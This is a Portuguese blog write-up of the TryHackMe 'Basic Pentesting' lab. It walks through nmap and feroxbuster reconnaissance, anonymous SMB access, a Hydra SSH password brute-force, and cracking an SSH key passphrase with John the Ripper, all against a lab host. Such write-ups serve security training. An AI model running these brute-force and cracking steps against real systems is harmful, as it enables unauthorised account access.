---
title: 'TryHackMe: Basic Pentesting'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Nmap, Feroxbuster, Smbclient, Hydra, Ssh, John ]
image:
  path: assets/images/tryhackme/basicpentesting/room.png
---

# ALVO

10.10.73.241

# NMAP

```
┌──(root㉿kali)-[/home/kali]
└─# nmap --top-ports 1000 10.10.73.241


Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 12:37 EST
Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.46% done; ETC: 12:40 (0:00:05 remaining)
Nmap scan report for 10.10.73.241
Host is up (0.27s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 345.91 seconds


┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 22,80,139,445,8009,8080 10.10.73.241


Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 12:45 EST
Nmap scan report for 10.10.73.241
Host is up (0.31s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h58m44s, deviation: 2h53m12s, median: 18m43s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-02-22T13:04:08-05:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-02-22T18:04:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds

```

# Feroxbuster

```
┌──(root㉿kali)-[/home/kali]
└─# feroxbuster -u http://10.10.73.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.73.241
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       24w      158c http://10.10.73.241/
301      GET        9l       28w      318c http://10.10.73.241/development => http://10.10.73.241/development/
200      GET        9l       89w      483c http://10.10.73.241/development/dev.txt
200      GET        7l       42w      235c http://10.10.73.241/development/j.txt
404      GET        9l       33w      287c http://10.10.73.241/video%20games
[######>-------------] - 3m     30509/87653   4m      found:26      errors:13
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_73_241-1740246829.state ...
[######>-------------] - 3m     30546/87653   4m      found:26      errors:13                                                                                                                                                               [######>-------------] - 3m     30514/87650   202/s   http://10.10.73.241/
[####################] - 1s     87650/87650   74280/s http://10.10.73.241/development/ => Directory listing (add --scan-dir-listings to scan)
[--------------------] - 0s         0/87650   -       http://10.10.73.241/development/dev.txt
[--------------------] - 0s         0/87650   -       http://10.10.73.241/development/j.txt
┌──(root㉿kali)-[/home/kali]

```

# Ler os arquivos da rota misteriosa:

```
> http://10.10.73.241/development/dev.txt

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

> http://10.10.73.241/development/j.txt

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```

# Smbclient

Listando compartilhamentos (sem autenticação):

```


smbclient -L //10.10.73.241 -N


        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

```

Se conectando ao compartilhamento Anonymous que provavelmente é público (sem autenticação)

```
smbclient //0.10.73.241/Anonymous -N


Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018
get
                14318640 blocks of size 1024. 11091912 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

# Verificar conteúdo de staff.txt

```

cat staff.txt

Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```

# Força bruta com Kay e Jan como usuários

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.73.241 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 13:14:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.73.241:22/
[STATUS] 262.00 tries/min, 262 tries in 00:01h, 14344140 to do in 912:29h, 13 active

[STATUS] 243.67 tries/min, 731 tries in 00:03h, 14343671 to do in 981:06h, 13 active
[22][ssh] host: 10.10.73.241   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-22 13:17:52

```

# Conectar SSH com a senha obtida.

```
ssh jan@10.10.73.241
```

Após isso, obter o id_rsa que permite a conexão com usuário kay.

Tentando conexão:

```
ssh -i id_rsa kay@10.10.73.241
Enter passphrase for key 'id_rsa': 
```

# Crackeando senha com John

```
ssh2john id_rsa > hash.txt 


john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2025-02-22 13:31) 11.11g/s 919288p/s 919288c/s 919288C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Com a senha podemos entrar na conta da kay.

![alt text](assets/images/tryhackme/basicpentesting/image.png)